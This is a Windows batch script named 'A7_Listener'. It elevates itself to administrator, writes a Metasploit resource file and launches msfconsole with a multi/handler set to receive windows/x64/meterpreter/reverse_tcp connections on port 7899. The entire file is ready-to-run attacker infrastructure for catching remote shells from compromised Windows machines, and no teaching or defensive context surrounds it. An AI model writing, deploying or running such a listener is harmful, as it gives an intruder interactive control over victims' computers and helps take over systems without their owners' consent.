@echo off
title A7_Listener
if not "%1"=="am_admin" (powershell start -verb runas "%0" am_admin & exit /b)
echo use exploit/multi/handler> %temp%\listener_temp & echo set payload windows/x64/meterpreter/reverse_tcp>> %temp%\listener_temp & echo set LHOST 0.0.0.0>> %temp%\listener_temp & echo set LPORT 7899>> %temp%\listener_temp & echo exploit -j>> %temp%\listener_temp
%systemdrive%
cd %temp%
%systemdrive%\metasploit-framework\bin\msfconsole.bat -q -r %temp%\listener_temp
